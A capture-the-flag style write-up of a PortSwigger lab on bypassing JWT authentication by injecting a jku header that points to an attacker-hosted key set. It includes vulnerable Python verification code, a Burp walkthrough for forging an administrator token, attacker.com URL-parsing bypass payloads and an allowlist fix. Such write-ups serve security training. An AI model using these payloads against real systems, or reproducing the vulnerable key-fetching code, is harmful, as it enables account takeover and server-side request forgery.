# 📝 Lab Breakdown: JWT Authentication Bypass via JKU Header Injection

- **Target:** PortSwigger Web Security Academy (Practitioner)
- **Vulnerability Class:** Improper Verification of Cryptographic Signature / SSRF for Key Fetching (CWE-347 / CWE-918)
- **Difficulty:** Practitioner
- **Key Mechanics:** Exploiting the `jku` (JWK Set URL) header parameter to force the backend to fetch and trust an attacker-hosted public key.

## 📐 Vulnerability Architecture & Logic Flow

```python
                     [ Phase 1: Attacker Infrastructure Setup ]
                               │
            1. Attacker generates RSA Key Pair.
            2. Attacker hosts the Public Key as a JSON Web Key Set (JWKS)
               on their Exploit Server: https://attacker.com/keys.json
                               │
                               ▼
                     [ Phase 2: Token Forgery ]
                               │
            3. Modifies Payload: {"sub": "administrator"}
            4. Injects Header:
               {"alg": "RS256", "jku": "https://attacker.com/keys.json", "kid": "my-key"}
            5. Signs token using the Malicious Private Key
                               │
                               ▼
                     [ Phase 3: Exploitation ]
               GET /admin (Cookie: session=eyJhbG...admin...)
                               │
                               ▼
            ┌───────────────────────────────────────────────┐
            │   JWT Handler Middleware                      │
            │   1. Parses the "jku" parameter.              │
            │   2. 🚨 Makes an outbound HTTP GET request    │
            │      to https://attacker.com/keys.json        │
            │   3. Retrieves the attacker's Public Key.     │
            │   4. Verifies signature using this key.       │
            │   ✅ Validation Passes!                       │
            └───────────────────────────────────────────────┘
```

## 🔬 Deep Dive: "Ask WHY" & Root Cause Analysis

### Why does this vulnerability exist?

In systems where multiple identity providers or microservices exist, servers often need a way to dynamically fetch the correct public key to verify a signature. The JWT specification provides the `jku` (JWK Set URL) parameter for this exact purpose. It tells the verifying server: *"Go to this URL to download the set of public keys, and use the one that matches my `kid` (Key ID)."*

**The Fatal Flaw:**
If the backend application blindly makes an HTTP request to whatever URL is provided in the `jku` header without validating it against a strict whitelist of trusted domains, it introduces two major vulnerabilities:

1. **Authentication Bypass:** The server fetches cryptographic material from an attacker-controlled server and uses it to establish trust, allowing the attacker to sign their own administrative tokens.
2. **Server-Side Request Forgery (SSRF):** The server makes outbound HTTP requests to arbitrary URLs supplied by the client.

#### Vulnerable Backend Implementation Example:

Python

```python
import jwt
import requests

# 🚨 VULNERABILITY: Blindly fetching cryptographic keys from an untrusted URL
def verify_session(token):
    try:
        unverified_header = jwt.get_unverified_header(token)
        jku_url = unverified_header.get('jku')
        kid = unverified_header.get('kid')

        if jku_url:
            # 🚨 SSRF & Cryptographic Bypass: No domain validation!
            response = requests.get(jku_url)
            jwk_set = response.json()

            # Find the matching key in the downloaded set
            public_key = extract_key_from_set(jwk_set, kid)

            # The server verifies the token using the attacker's hosted public key!
            payload = jwt.decode(token, key=public_key, algorithms=["RS256"])
            return payload

    except Exception:
        return None
```

## 🛠️ Step-by-Step Exploitation Walkthrough

### Phase 1: Generate Malicious RSA Keys & Host the JWK Set

1. Go to the **JWT Editor Keys** tab in Burp Suite and click **New RSA Key**.
2. Click **Generate**, then click **OK** to save it.
3. Right-click your newly generated key and select **Copy Public Key as JWK**.
4. Go to your **Exploit Server**. In the **Body** section, format the copied JWK into a standard JSON Web Key Set (a JSON object with a `keys` array). It should look exactly like this:JSON
    
    ```
    {
        "keys": [
            {
                "kty": "RSA",
                "e": "AQAB",
                "kid": "893d8f-b98a-...",
                "n": "zx..."
            }
        ]
    }
    ```
    
5. Click **Store** to host this file on your exploit server (take note of the Exploit Server URL).

### Phase 2: Forge and Sign the Token

1. Intercept a request to the target site (using your `wiener` session) and send it to **Repeater**.
2. Switch to the **JSON Web Token** tab.
3. In the **Header** section, add the `jku` parameter pointing to your Exploit Server URL. Ensure the `kid` parameter matches the `kid` value from the JWK you just hosted:JSON
    
    ```
    {
        "kid": "893d8f-b98a-...",
        "jku": "https://exploit-0a1b2c.exploit-server.net/exploit",
        "alg": "RS256"
    }
    ```
    
4. In the **Payload** section, change the `"sub"` claim from `"wiener"` to `"administrator"`.
5. At the bottom, click **Sign**. Select your generated RSA key from the prompt.
6. **Crucial Step:** When prompted by the JWT Editor, **uncheck** the box that says *"Update 'kid' parameter"* or *"Update 'jku' parameter"* so Burp doesn't overwrite your manual header injections.

### Phase 3: Execute the Attack

1. Modify the HTTP request path to `GET /admin/delete?username=carlos`.
2. Ensure your forged JWT is in the `session` cookie.
3. Send the request. The server will fetch the key from your exploit server, verify the signature, and delete Carlos.

## 📋 Personal Bug Hunting Checklist: Dynamic Key Fetching

- **Look for `jku` Support:** Manually add `"jku": "[https://your-burp-collaborator.net](https://your-burp-collaborator.net)"` to the JWT header and send it. If you get an HTTP/DNS ping on your Collaborator, the server is vulnerable to SSRF and likely Auth Bypass.
- **Test URL Parsing Bypasses:** If the server attempts to whitelist domains (e.g., checking if the URL contains `trusted.com`), test URL parsing discrepancies:
    - `[https://trusted.com@attacker.com/keys.json](https://trusted.com@attacker.com/keys.json)`
    - `[https://attacker.com/keys.json#trusted.com](https://attacker.com/keys.json#trusted.com)`
    - `[https://trusted.com.attacker.com/keys.json](https://trusted.com.attacker.com/keys.json)`
- **Check for Open Redirects:** If the server enforces the `jku` domain strictly but that trusted domain has an Open Redirect vulnerability, you can bounce the key-fetch request to your own server (`jku: [https://trusted.com/redirect?url=https://attacker.com/keys.json](https://trusted.com/redirect?url=https://attacker.com/keys.json)`).

## 🛡️️ Remediation Strategy

Avoid dynamic key fetching based on client input whenever possible. If the `jku` parameter must be supported (e.g., for OIDC federation), the backend must strictly validate the URL against a hardcoded allowlist of trusted identity providers.

Python

```python
import jwt
import requests
from urllib.parse import urlparse

# ✅ REMEDIATION: Strict domain allowlist
TRUSTED_DOMAINS = ["login.microsoftonline.com", "accounts.google.com"]

def verify_session(token):
    try:
        unverified_header = jwt.get_unverified_header(token)
        jku_url = unverified_header.get('jku')
        kid = unverified_header.get('kid')

        if jku_url:
            parsed_url = urlparse(jku_url)

            # ✅ Validates that the requested domain is strictly in the allowlist
            if parsed_url.hostname not in TRUSTED_DOMAINS:
                raise Exception("Untrusted JKU domain")

            response = requests.get(jku_url, timeout=5)
            jwk_set = response.json()
            public_key = extract_key_from_set(jwk_set, kid)

            payload = jwt.decode(token, key=public_key, algorithms=["RS256"])
            return payload

    except Exception:
        return None
```